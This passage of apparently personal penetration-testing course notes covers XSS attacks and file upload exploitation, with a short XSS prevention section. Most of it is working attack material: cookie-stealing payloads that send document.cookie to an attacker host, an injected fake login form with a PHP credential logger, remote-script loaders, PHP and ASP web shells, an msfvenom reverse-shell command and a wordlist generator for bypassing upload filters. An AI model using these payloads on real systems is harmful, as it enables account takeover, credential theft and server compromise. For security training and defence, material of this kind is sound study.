> Many modern web apps use cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web app. This is why `window.origin` is more effective than a static value. 

As some modern browsers may block the `alert()` JS function in specific locations, it is useful to know other basic XSS payloads to verify the existence of XSS: 
```js
<plaintext>    #Stops rendering the HTML code that comes after it and displays it as plaintext

<script>print()</script>   #Pops up the browser print dialog, which is unlikely to be blocked by any browsers
```

Tp confirm whether the payload is persistent and stored on the back-end, the page can be refreshed to see whether the alert is shown again. Again, any user who visits the page will trigger the XSS payload and get the same alert. 

Besides these payloads, the following can also be used as user input:
```js
<script>alert(1)</script> 

<script>alert(window.origin)</script>

<script>print('{Anything}')</script>

<script>alert(document.cookie)</script>
```

<a id="reflectedxss"></a>

#### **`Reflected XSS`**

Reflected XSS vulnerabilities occur when user input reaches the back-end server and gets returned to the user without being filtered or sanitized. There are many cases in which the entire user input might get returned to them, like error messages or confirmation messages. In these cases, users can attempt using XSS payloads to see whether they execute; however, as these messages are usually temporary, once leaving the page, they will not execute again, meaning they are non-persistent.

Similar to that of stored XSS, determine whether user input is displayed on the page after entering it:
* If the user input is included as part of the error message, and if the input was not filtered or sanitized, the page may be vulnerable to XSS. 

Again, try the `<script>alert(window.origin)</script>` payload or other basic XSS payloads. While these may execute, an error message will also be generated but without the exact user input; an empty string may be shown. This is because the payload is wrapped with a `<script>` tag that does not get rendered by the browser.
* The payload, however, can be viewed by inspecting the page source. 
   
Depending on which HTTP request is used to send user input to the server, victims can be targeted through this type of XSS. This can be checked through the Firefox Developr Tools (CTRL+Shift+I) and selecting the Network Tab. After doing so, the payload can be tested, clicking Add to send it.
* Find the row that has the particular request, most likely a GET request

* To target the user, send them a URL containing the payload
   * To get the URL, copy the URL from the URL bar after sending the XSS payload, or right click on the request in the Network tab and copy the URL


Besides these payloads, the following can also be used as user input:
```js
<img src="" onerror=alert(window.origin)>

<img src="" onerror=alert(document.cookie)>

#"><img src=/onerror=alert(document.cookie)>
```

<a id="domattacks"></a>

#### **`DOM Attacks`**

DOM XSS is completely processed on the client-side through JS. DOM XSS occurs when JS is used to change the page source through the **`Document Object Model (DOM)`.**

To determine whether a web app is vulnerable to DOM XSS, check whether a new request is being made through the Network Tab in the Developer tools by adding an item
* The input parameter in the URL may use a `#` for the item added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JS and never reaches the back-end, therefore being a DOM-based XSS

* By inspecting the page source, the input string will also not be found. This is because the JS code is updating the page when the Add button is clicked in the Developer tools, which is after the page source is retrieved by the browser; therefore, the base page source will not show the input. If the web page is refreshed, it will also not be retained. 

To better understand DOM-based XSS vulnerabilities, the concept of the **`Source and Sink`** of the object displayed on the page must be understood.
* The **Source** is the JS object that takes the user input, and it can be any input parameter like a URL parameter or an input field

* The **Sink** is the function that writes the user input to a DOM object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JS functions to write to DOM objects include:
   * `document.write()`
   * `DOM.innterHTML`
   * `DOM.outerHTML`
   * Some of the jQuery library functions that write to DOM objects include the following
      * `add()`
      * `afer()`
      * `append()`

If a Sink function writes the exact input without any sanitization (like the above functions), and no other means of sanitization were used, then the page would be vulnerable to XSS. To determine this, look at the source code and check the JS script (often script.js), and look at the parameter that the **Source** is taking. It may look like the following:
```js
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

Now, determine if there is a **Sink** function. Using the Source as an example, the following shows a related **Sink** that is vulnerable to DOM-based XSS:
```js
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```
* At this point, it is clear that the input can be controlled and the output is not sanitized; therefore, the page is vulnerable to DOM-based XSS.

<br>

The XSS payload will not execute if directly entered as user input. This is because the **`innerHTML`** function does not allow the use of the **`<script>`** tags within it as a security feature. Other tags, however, can be used to trigger DOM-based XSS:
```js
<img src="" onerror=alert(window.origin)>
```

In this case, a new HTML image object is created, which has a **`onerror`** attribute that can execute JS code when the image is not found. So, as an empty image link ("") is provided, the code should always get executed without having to use **`<script>`** tags. This can also be triggered by doing the following as well:
```js 
http://SERVER_IP:PORT/#task=<img src=
```

To target a user with this DOM XSS vulnerability, the URL can be copied from the browser and shared directly with them. Once they visit it, the JS code should execute. THe previous payloads are common, and there are many instances where various payloads may be used depending on the security of the web app and the browser.

<a id="xssdefacing"></a>

#### **`Defacing`**

One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. Defacing a website means changing its look for anyone who visits the website. Injeced JS code through XSS can be used to make a web page look different from originally intended; howver, defacing a website is usually used to send a message. Four HTML elements are usually used to change the main look of a web page:
* Background Color: `document.body.style.background`

* Background: `document.body.background`

* Page Title: `document.title`

* Page Text: `DOM.innerHTML`

Two or three of the aforementioned elements can be used to write a basic message to the web page and even remove the vulnerable element, such that it would be more difficult to quickly reset the web page

<br>

**<u>Changing Background</u>**

To change a web page's background, a certain color or image can be chosen. This color can be used as the background since most defacing attacks use a dark color for the background. To do so, the following payload can be used:
```js
<script>document.body.style.background = "#141d2b"</script>
```
* This command sets the background color to a specific hex value. This can be done, or the color can be directly named like = "black"

This will be persistent through page refreshes and will appear for anyone who visits the page; this is stored XSS.    

Besides this, the background can eb set to an image, by using the following payload:
```js
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

<br>

**<u>Changing Page Title</u>**

The page title can be changed to any title of choosing by using the `document.title` JS property:
```js
<script>document.title = 'pwned'</script>
```

After doing so, the page window/tab will have a pwned as the title

<br>

**<u>Changing Page Text</u>**

There are various JS functions for changing the text displayed on the web page. For example, the text of a specific HTML element/DOM can be changed using the innerHTML property:
```js
document.getElementById("todo").innerHTML = "New Text"
```

jQuery functions can be used for more efficiently achieving the same thing or for changing the text of multiple elements in one line. To do so, **the jQuery library must have been imported within the page source:**
```js
$("#todo").html('New Text');
```
* This gives the user various options to customize the text on the web page and make minor adjustments to meet their needs. 


To change the entire HTML code of the main body, using innerHTML, the following can be used:
```js
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```
* The body element can be specified with `document.getElementsByTagName('body')`, and by specifying [0], the first body element is selected, which should change the entire text of the web page. 

<a id="xssphishing"></a>

#### **`Phishing`**

A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account

On web pages that allow a URL to be input in a user field, basic XSS payloads can be input. This can either be directly on the user field or on the URL using the appropriate parameter. 
* Start by trying the basic XSS payloads

If none of the basic XSS payloads work, the XSS Discovery process must be attempted. Before continuing, try to find an XSS payload that successfully executes JS code on the page. **To understand which payload should work, try to view how the input is displayed in the HTML source after it is added.**

<br>

**<u>Login Form Injection</u>**

Once a working XSS payload is identified, a phishing attack can be conducted. To perform this attack, HTML code must be injected that displays a login form on the targeted page. This form should send the login information to a server that the attacker is listening on, such that once a user attempts to login, the credentials will be obtained.

The following example presents a login form in HTML that can be used:
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

The following example includes a login form in HTML with XSS code. To write HTML code to the vulnerable page, the JS function `document.write()` is used. This is used with the XSS payload found during the XSS discovery step. Once the HTML code is minified into a single line and added inside the write function, the final JS code should be as follows:
```js
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

At this point, the JS code can be injected using the previously found XSS payload (instead of running, for example, alert(window.origin)). It would be better for the payload to be inserted directly in the URL after the appropriate parameter.

<br>

**<u>Credential Stealing</u>**

At this point, login credentials can be stolen when the victim attempts to log in on the injected login form. The aforementioned HTML form is designed to send the login request to the attackers IP, which should be listening for a connection. 

Start a netcat server to see what kind of request is received when someone attempts to login through the form:
```bash
sudo nc -lvnp 80
```

Credentials are captured whenever a victim attempts to log in with the form. However, the HTTP request will not be handled correctly and the victim would be receive an error. It would be better to use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in. **The following PHP script should do what is needed; place it in /tmp/tmpserver/**
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: <http://original page>");
    fclose($file);
    exit();
}
?>
```

The following can be done instead of using the nc listener:
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php    #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```
* The login credentials will be logged to the `creds.txt`

#### **`Session Hijacking`**

Modern web apps use cookies to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged in session alive even if they visit the same website at another time or date. However, they may be able to gain logged in access with the victim's user without knowing their credentials.

With the ability to execute JS code on the victim's browser, an attacker may be able to collect their cookies and send them to the server to hijack their logged in session by performing a **Session Hijacking (Cookie Stealing)** attack.

<br>

**<u>Blind XSS Detection</u>**

A blind XSS vulnerability occurs when the vulnerability is triggered on a page that is not accessible to the user. These vulnerabilities usually occur with forms only accessible by certain users. Some potential examples include:
* Contact Froms
* Reviews
* User Details
* Support Tickets
* HTTP User-Agent Header

If a message is generated after submitting user input, it indicates the handling of the input will not be seen or how it will look in the browser, since it will appear for higher-level users in a different page that is not accessible. In normal (non-blind) cases, each field can be tested for an XSS vulnerability. However, if there is no access to the separate page for higher-level users after submitting the form, this must be done in a different way. 
* To do so, use a JS payload that sends an HTTP request back to the attacker's server. If the JS code gets executed, the attacler will get a response on their machine, and they will know that the page is vulnerable. This introduces two issues:
   * **Which specific field is vulnerable?** Since any of the fields may execute the code, it is impossible to know which one did
   * **Which XSS payload should be used?** Since the page may be vulnerable, but the payload may not work

<br>

**<u>Loading a Remote Script</u>**

Before sending the payloads, a listener needs to be started on the attacker machine via netcat or php:
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

In HTML, JS code can be written within the `<script>` tags, but they must also include a remote script by providing its URL:
```js
<script src="http://OUR_IP/script.js"></script>
```

This remote JS file can be executed that is served on the attacker's machine. The requested script name can be changed from script.js to the name of the field that is being injected, so that when the attacker gets a request, they will be able to determine which input field is vulnerable.

For example, assume there is a username input field. The following payload should be injected into that field:
```js
<script src="http://OUR_IP/username"></script>
```
If there is a request for /username, then the atacker will know that the username field is vulnerable to XSS, and so on. With that, various XSS payloads that load a remote script can be tested, noting which of them sends a request. The following are examples that can be used from [PayloadsAlltheThings:](http://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)
```js
<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>
```

* Payloads that start with `>` may or may not work depending on how the input is handled in the backend. If there is access to the source code, it would be possible to precisely write the required payload for a successful injection. This is why blind XSS has a higher success rate with DOM XSS type of vulnerabilities

> Some email fields may be forced to match an email format. Even when trying to manipulate the HTTP request parameters, the input may be validated on both the front-end and the back-end. In this case, the email field will not be vulnerable, so it does not need to be tested. Similarly, the password field can be skipped, as they are usually hashed and not typically shown in cleartext

After submitting the form, wait a few seconds and check the terminal to see if anything called the server. If nothing calls the server, proceed to the next payload(s). Once the server is called, note the last XSS payload as the working payload and the input field as the vulnerable field. 

<br>

**<u>Session Hijacking</u>**

Once a working XSS payload and vulnerable input field have been identified, a session hijacking attack can be performed. This attack requires a JS payload to send the required data and a PHP script hosted on the attacker's server to grab and parse the transmitted data. 

There are several JS payloads that can be used to grab the session cookie, which again, can be found on PayloadsAllTheThings:
```js
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Using any of the two payloads should work in sending a cookie, but the second one adds an image to the page, which may not look very malicious; the first one navigates the user to the cookie graber PHP page, which may look suspicious. Change the URL in the working XSS payload to use script.js **Either JS payload can be written to script.js, which will be hosted on the attacker's machine.** 

With the PHP server running, the code can be used as part of the XSS payload, send it in the vulnerable input field, and a call with the cookie value should be sent to the server. However, if there were many cookies, it may be difficult to know which cookie value belongs to which cookie header, so the following PHP script can be written to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, all of their cookies will be ordered in the file:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

When a victim views the XSS payload, there will be two requests on the server, one for script.js, which in turn will make another request with the cookie value. If the previous PHP script is used, then the cookies will be logged. 
* Once the cookie value is given, use it to login to the corresponding page. This can be done by going to the Developr tools and adding a cookie value in the storage tab. Once the cookie is set up, refresh the page to get access as the victim.

<a id="xssprevention"></a>

#### **`XSS Prevention`**

XSS vulnerabilities are mainly linked to two parts of the web application: A **Source** like a user input field and a **Sink** that displays the input data. These are the two main points that should be secrued, both in the front-end and in the back-end. The most important aspect of preventing XSS vulnerabilities is proper input sanitization and validation on both the front and back end. In addition to that, other secure measures can be taken to help prevent XSS attacks. 

**<u>Front-End</u>**

As the front-end of the web app is where most of the user input is taken from, it is essential to **sanitize and validate the user input on the front-end using JS.** Code can be written to return true or false whether it matches regex validation. In addition, developrs should always ensure that they do not allow any input with JS code in it, by escaping any special characters. The DOMPurify JS library can be used for this, which escapes any special characters with a backslash `\`. which should help ensure that a user does not send any input with special characters, preventing DOM XSS vulnerabilities. Finally, the developr should always ensure that they never use user input directly within certain HTML tags. 

Besides this, avoid using JS functions that allow changing raw text of HTML fields. Ass these functions write raw text to the HTML code, if any user input goes into them, it may include malicious JS code, which leads to an XSS vulnerability:
* `DOM.innerHTML`
* `DOM.outerHTML`
* `document.write()`
* `document.writeln()`
* `document.domain`
* And the following jQuery functions:
    * `html()`
    * `parseHTML()`
    * `add()`
    * `append()`
    * `prepend()`
    * `after()`
    * `insertAfter()`
    * `before()`
    * `insertBefore()`
    * `replaceAll()`
    * `replaceWith()`

<br>

**<u>Back-End</u>**

Also, ensure that XSS vulnerabilities are prevented with measures on the back-end to prevent stored and reflected XSS vulnerabilities. Even if there is front-end validation, that will not be enough to prevent injecting a malicious payload. Therefore, there should be XSS prevention measures on the back-end as well. This can be achieved with **Input and Output Sanitization and Validation, Server Configuration, and Back-End Tools** that help prevent XSS vulnerabilities. 
* Input validation in the back-end is similar to the front-end, and it uses regex or library functions to ensrue that the input field is what is expected. It it does not match, then the back-end server will reject it and not display it

* Input sanitization can be easily bypassed by sending custom GET or POST request on the front-end. There are libraries for various back-end languages that can properly sanitize any user input, ensuring that no injection can occur. Again, the DOMPurify library can be used with a NodeJS back-end. 

* Output encoding means that any special characters are encoded into their HTML codes, which is helpful to display the entire user input without introducing an XSS vulnerability. For a PHP back-end, the `htmlspecialchars` or the `htmlentities` functions can be used, which would encode certain special characters into their HTML codes, so the browser will display them correctly, but they will not cause any injection of the sort. 


<br>

**<u>Server Configuration</u>**

The following back-end web server configurations may help in preventing XSS attacks:

* Using HTTPS across the entire domain.

* Using XSS prevention headers.

* Using the appropriate Content-Type for the page, like X-Content-Type-Options=nosniff.

* Using Content-Security-Policy options, like script-src 'self', which only allows locally hosted scripts.

* Using the HttpOnly and Secure cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

Also, having a good WAF can significantly reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests. Furthermore, some frameworks provide built-in XSS protection, like ASP.NET

<a id="fileuploadattacks"></a>

### **`File Upload Attacks`**

If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like execuring arbitrary commands on the back-end server to take control over it. File upload vulnerabilities are amongst the most common vulnerabilities found in web and mobile applications; they are often scored as High or Critical.

The most common reason behind file upload vulnerabilities is weak file validation and verification, which may not be well secured to prevent unwanted file types or could be missing altogether. The worst possible kind of file upload vulnerability is an **unauthenticated arbitrary file upload vulnerabilities,** in which a web app allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server. 

The most common and critical attack caused by arbitrary file uploads is gaining RCE over the back-end server by uploading a web shell or uploading a script that sends a reverse shell. In some cases, the users may only be able to upload a specific file type. Even in these cases, there are various attackers that may be performed to exploit the file upload functionality if certain security protections were missing from the web app. Examples of these attacks include:
* Introducing other vulnerabilities like XSS or XXE.

* Causing a DoS on the back-end server.

* Overwriting critical system files and configurations.

Finally, a file upload vulnerability is not only caused by writing insecure functions, but is also often caused by the use of outdated libraries that may be vulnerable to these attacks.

<a id="fileuploadabsvalid"></a>

#### **`Absent Validation`**

The most basic type of file upload vulnerability occurs when the web application does not have any form of validation filters on the uploaded files, allowing the upload of any file type by default. With these types of vulnerable web apps, it is possible to directly upload a web or reverse shell; then, by just visiting the uploaded script, the attacker can interact with the shell.


**<u>Identifying Web Framework</u>**

First, upload a malicious script to determine whether any file type can be uploaded to the back-end server, testing whether it can be used to exploit the back-end. Many kinds of scripts can exploit web apps through arbitrary file upload, most commonly a web shell script and a reverse shell script. 
* **`Web Shell`:** Provides an easy method to interact with the back-end server by accepting shell commands and printing their output back within the web browser. A web shell has to be written in the same programming language that runs the web server, as it runs platform-specific functions and commands to execute system commands on the back-end server, making web shells non-corss-platform scripts.
   * Therefore, the first step is to identify what language runs the web app

Identifying the web app language can often be seen by looking at the web page extension in the URL. In certain web frameworks and web languages, web routes are used to map URLs to web pages, in which case, the web page extension may not be shown. Furthermore, file upload exploitation would also be different, as the uploaded files may not be directly routable or accessible. 

The best way to determine what language runs the web app is to visit the **`/index.ext`** page, where **ext** is swapped with various common web extensions, like php, asp, aspx, etc. 
* This can be automated via ffuf, gobuster, Burp, Zap, etc
   * Note that this method may not always be accurate, as web apps may not use index pages, or may use more than one web extension
* If this method does not work, then use Wappalyzer
   * This may be more useful as this will also identify the type and version of the web server, the back-end OS, and other technologies. 

Once the language running the web app is identified, a malicious script written in the same language can be uploaded to exploit the web app and gain RCE over the back-end server. 

<br>

**<u>Vulnerability Identification</u>**

As an initial test to identify whether arbitrary files can be uploaded, create a basic script to determine whether code can be executed with the uploaded file. The following scripts can be used as a PoC for PHP:
```bash
echo "<?php echo "Hello world"; ?> " > test.php

echo "<?php system('hostname'); ?> " > hostname.php

echo "<?php phpinfo(); ?>" > info.php
```

If the file is uploaded successfully, that indicates that the web app has no back-end file validation. Now, try to find the directory that contains the uploaded file. Once this is located, the script should print the message. This means that the echo function was executed to print the string and PHP code was successfully executed on the back-end server. 
* If the page could not run PHP code, then the source code would be printed on the page. 

<a id="fileuploadupexpl"></a>

#### **`Upload Exploitation`**

After it is confirmed that the back-end server does not validate the file, a malicious script in the same language as the web application can be uploaded. Once the malicious script is uploaded and the link is visited, it will be possibel to interact with it to take control over the back-end server. One technique is uploading a **`Web Shell`** to the web app.
* One good web shell option for PHP is **`phpbash`,** which provides a terminal-like, semi-interactive web shell. Seclists also provides many web shells for different frameworks and languages

It may be necessary to write a custom web shell in certain cases. The following is a PHP script that can be used on PHP web apps:
```php
<?php system($_REQUEST['cmd']); ?>

```
This script can be written to a .php file and uploaded to a web app. Once uploaded, system commands can be executed with the **`?cmd=`** GET parameter; i.e., ?cmd=pwd:
* If this is used in a browser, it may be best to view the source code, as it will show the command output as it would be shown in the terminal, without any HTML rendering that may affect how the output is formatted. 

If the web app is **`.NET`,** the following web shell can be created in asp:
```bash
<% eval request('cmd') %>

```

> In many cases, web shells may not work due to the web server preventing the use of some functions use by the web shell or a WAF. In these cases, advanced techniques must be used to bypass these security mitigations. 

<br>

Besides web shells, **`Reverse Shells`** can be received through the vulnerable upload functionality. To do so, start by downloading a reverse shell script in the language of the web app. 
* One good reverse shell option for PHP is **`pentestmonkey`.** Seclists also provides many reverse shells for different frameworks and languages

Once the web reverse shell is uploaded, start a netcat listener on the corresponding port of the reverse shell. Once the uploaded reverse shell is run on the back-end server, a connection will be established. 

Reverse shell scripts can also be created through **`msfvenom`.** The following example demonstrates how to create a reverse shell script in PHP that may attempt to bypass certain restrictions:
```bash
msfvenom -p php/reverse_php LHOST=<OUR_IP> LPORT=<OUR_PORT> -f raw > reverse.php

```
* The **`-p`** flag specifies the reverse shell payloads

* The **`-f`** flag specifies the output language

Once the script is generated, start a netcat listener on the specified port. After, upload the malicious script and visit its link. At this point, the reverse shell should be established. 

Reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, but they may not always work; in this case, web shells should be used. This can be due to the back-end networking having a firewall rule that denies outgoing connections, or if the web server disables the necessary functions to initiate a connection. 

<a id="fileuploadclientvalid"></a>

#### **`Client-Side Validation (Bypassing Filters)`**

Many web apps only rely on front-end JS code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format. 
* As the file format validation is happening on the client-side, interacting directly with the server can skip the front-end validations altogether.

* The front-end code can also be modified through the browser's dev tools to disable any validation in place. 

Suppose when uploading a file the file selection dialog is limited to image formats only. This indicates some form of file type validation, so a reverse shell or web shell written in the same language will be rejected.
* If validation appears to be happening on the front-end (the page won't refresh or send any HTTP requests after selecting the file), the attacker will have complete control over these client-side validations. 

   * While the web server is responsile for sending the front-end code, the rendering and execution of the front-end code happen within the browser. If the web app does not apply any of these validations on the back-end, any file type should be able to be uploaded. 

**To bypass these protections, either the upload request to the back-end server can be modified, or the front-end code can be manipulated to disable these validations.**

<br>


**<u>Back-end Request Modification</u>**

When an image is selected, it will oftentimes be reflected somewhere on the page and persist through refreshes. This indicates that the image was uploaded to the server. **Capture the upload request with Burp**

First determine where the HTTP upload request is being sent to; this is often a post request. This way, the request can be modified to meet the needs of the attacker without having the front-end type validation restrictions. If the back-end server does not validate the uploaded file type, then the attacker should be able to send any file type/content, and it would be uploaded to the server. **The following are the two important parts in the request, both at the end of the request:**
1. **`filename=`:** The filename should be modified to the same language as the server

2. **`File Content`:** The content should be modified to a web/reverse shell. In the case of an image, all of the original image data can be deleted and replaced with a shell. 

> The Content-Type of the uploaded file can also be modified.

If the request goes through, visit the uploaded file, interact with it, and gain RCE

<br>

**<u>Disabling Front-end Validation</u>**

Front-end code is processed completely within the web browser, so the attacker can modify the scripts or disable them entirely. After this is done, the attacker can use the upload functionality to upload any file type without needing to use Burp to capture and modify their requests. 

Begin by **toggling the browser's `Page Inspector,`** and then click on where the uploaded image is reflected. This will highlight the corresponding HTML file input, but depending on the front-end code, it will vary:
* Look through the code, specifically the event handler attributes

* Determine which attribute runs code whenever a file is selected, this will indicate that file type validation
    * Once the attribute is determined, go to the browsers **`Console`** and type the function's name to get its details. The function's name is the function declared by the attribute. 

    * Read through the function and either add PHP as one of the allowed extensions or modify the function to remove the extension check. It may be easier to remove the extension check instead of writing and modifying JS code. However, make sure that removing the extension check does not break anything: it does not in most cases. 

* If deciding to **delete the function, go back to the `Page Inspector`** and double click on the function name to select it, then delete it. 
    * To make file selection easier, attributes that specify allowable file extensions can also be removed. This is not mandatory, however. 

> It is important to remember that the modifications made to the source code will not persist through page refreshes. However, it will be enough to bypass the client-side validation

Once the shell is uploaded, use the **`Page Inspector`** again and click on the profile image; this will lead to the URL of the uploaded shell in most cases. Click on the link and interact with the shell to execute commands on the back-end server. 

<a id="fileuploadblkfilt"></a>

#### **`Blacklist Filters (Bypassing Filters)`**

If attempting to bypass client-side validation by modifying front-end code or interacting directly with the back-end does not work, this indicates that the web app may have some form of file type validation on the back-end, in addition to the front-end validations. There are generally two common forms of validating a file extension on the back end:
* **Testing against a `blacklist` of types**

* **Testing against a `whitelist` of types**

The validation may also check the file type or the file content for type matching. The weakest form of validation amongst these is testing the file extension against a blacklist of extension to determine whether the code upload request should be blocked. 
* In some cases, the code will take the file extension from the uploaded file name and then compare it against a list of blacklisted extensions. This validation method is not comprehensive, as many other extensions are often not included in this list, which may still be used to execute code on the back-end server if uploaded. 

* Many times, the comparisons are case-sensitive, only considering lowercase extensions. In Windows servers, file names are case insensitive, so try uploading a file with a mixed-case (i.e., pHp), which may bypass the blacklist. Try to exploit this weakness to bypass the blacklist and upload malicious files. 

<br>

**<u>Fuzzing Extensions</u>**

If the web app seems to be testing the file extension, the first step should be to **fuzz the upload functionality with a list of potential extensions and see which of them return an error message.** Any upload request that does not return an error message, returns a different message, or succeeds in uploading the file, may indicate an allowed file extension. 
* Use either PayloadsAlltheThings or seclists for common web extensions

For Burp, send the upload request to **`Intruder`** and select the **`.ext`** to add it as a fuzzing position. Keep the file content the same for this attack, as only the file extensions are being fuzzed. **Untick the URL Encoding option** to avoid encoding the period before the file extension. Once this is done, start the attack to start fuzzing for file extensions that are not blacklisted. 
* When this is done, sort the results by length. It will be clear from this point which extensions are validated, as they will all have a certain Content-Length and a success message. 

<br>

**<u>Non-Blacklisted Extensions</u>**

At this point, try uploading a file using any of the allowed extensions from the previous extension scan. Some of them may allow the execution of code. It is important to remember that not all the previously validated extensions will work with all web server configurations, so many of the extensions may need to be attempted to determine which one successullt executes code. 
* Send the successful extensions to **`Repeater`**
   * Change the **File Name** of the malicious script to use the extension

   * Change the **Content** to that of a shell

Once a malicious file is uploaded, the final step is to visit the uploaded file, which should be under the image upload directory. At this point, test executing a command if it is a web shell or start a netcat listener. This will confirm if the blacklist was bypassed or not.

<a id="fileuploadwhitefilt"></a>

#### **`Whitelist Filters (Bypassing Filters)`**

A whitelist is generally more secure than a blacklist. The web server would only allow the specified extensions, and the list would not need to be comprehensive in covering uncommon extensions. Still, there are different use cases for a blacklist and for a whitelist. 
* While a blacklist may be helpful in cases where the upload functionality needs to allow a wide variety of file types, a white list is usually only used with upload functionalities where only a few file types are allowed. Both may also be used in tandem


**<u>Whitelisting Extensions</u>**

Like fuzzing for allowable extensions not on the blacklist, the same can be done in the case of a whitelist through **`Burp Intruder`.** It is important to note that error messages do not always reflect which form of validation is being used. 
* In the case of a whitelist, it is possible that all variations of PHP extensions, for example, are blocked. Try to fuzz the upload form with a seclist or PayloadsAlltheThings wordlist to find what extensions are whitelisted by the upload form

* Look through the requests to find malicious extensions that were not blocked. Some scripts use regex to test whether the file name contains any whitelisted image extensions
   * Regex only checks whether the file name contains the extension and not if it actually ends with it.

<br>

**<u>Double Extensions</u>**

Oftentimes, the code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through **Double Extensions.** For example, if the `.jpg` extension was allowed, it can be added to the upload file name while still ending the file name with `.php` (i.e., shell.jpg.php), in which case, should be able to pass the whitelist test while still uploading a PHP script that can execute PHP code.

At this point, intercept a normal upload request, and modify the filename and content to that of a web shell or reverse shell. Once the upload is successful, visit the uploaded file and try to send a command. If this works, that means that the uploaded file is a fully working script. 

This method may not always work, as some web apps may use a strict regex pattern; however, there are other exploitation techniques that may allow an attacker to bypass the pattern, but most rely on misconfigurations or outdated systems. 

<br>

**<u>Reverse Double Extension</u>**

In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability. For example, an organization may use an open-source web app that has a file upload functionality. Even if the file upload functionality uses a strict regex pattern that only matches the final extension in the file name, the organization may use the insecure configurations for the web server. 

In this case, try to change the filename to something like **`shell.ext.jpg`** and change the file content to that of a web or reverse shell. If this works, visit the uploaded file and attempt to execute a command (webshell) or start a listener (reverse shell).

<br>

**<u>Character Injection</u>**

Another method of bypassing a whitelist validation test can be through character injection. **Several characters can be injected before or after the final extension to cause the web app to misinterpret the filename** and execute the uploaded file as a malicious script. The following are some of the characters that can be attempted in specific use cases:
* `%20`

* `%0a`

* `%00` shell.php%00.jpg works with PHP servers with version 5.x or earlier, as it causes the PHP web server to end the file name after the %00, and store it as shell.php, while still passing the white list

*`%0d0a`

* `/`

* `.\`

* `.`

* ``

* `:` May be used with web apps hosted on a Windows Server. This is used by injecting a colon before the allowed file extension (i.e., shell.aspx:.jpg), which would store the file as shell.aspx

Each of the other characters has a use case that may allow the upload of a PHP script will bypassing the type validation test. A bash script can be written to generate all permutations of the file name, where the above characters would be injected before and after both the PHP and JPG file extensions:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

```

With this custom wordlist, run a fuzzing scan with **`Burp Intruder`,** similar to the aforementioned ones. If either the back-end or the web server is outdated or has certain misconfigurations, some of the generated filenames may bypass the whitelist test and execute PHP code (in this case).
* The script can be modified to add more PHP extensions to generate more file name permutations. 

<a id="fileuploadtypefilt"></a>

#### **`Type Filters (Bypassing Filters)`**

It may be possible to gain control over the back-end server even with image extensions. Furthermore, an attacker may use some allowed extensions to perform other attacks. It is not enough to only test the file extensions. This is why many modern web servers and web apps also test the content of the uploaded file to ensure it matches the specified type. While extension filters may accept several extensions, content filters usually specify a single category (i.e., images, videos, documents), which is why they do not typically use blacklists or whitelists. THis is because web servers provide functions to check for the file content type, and it usually falls under a specific category.

There are two common methods for validating the file content: **Content-Type Header** or **File Content**

**<u>Content-Type</u>**

If a file fails to upload even after using the aforementioned bypass techniques, that indicates that the file extension does not affect the error message and the web app must be testing the file content for type validation. 

Browsers automatically set the Content-Type header when selecting a file through the file selector dialog, usually derived from the file extension. However, since the browser sets this, this operation is a client-side operation, and can be manipulated to change the perceived file type and potentially bypass the type filter. 

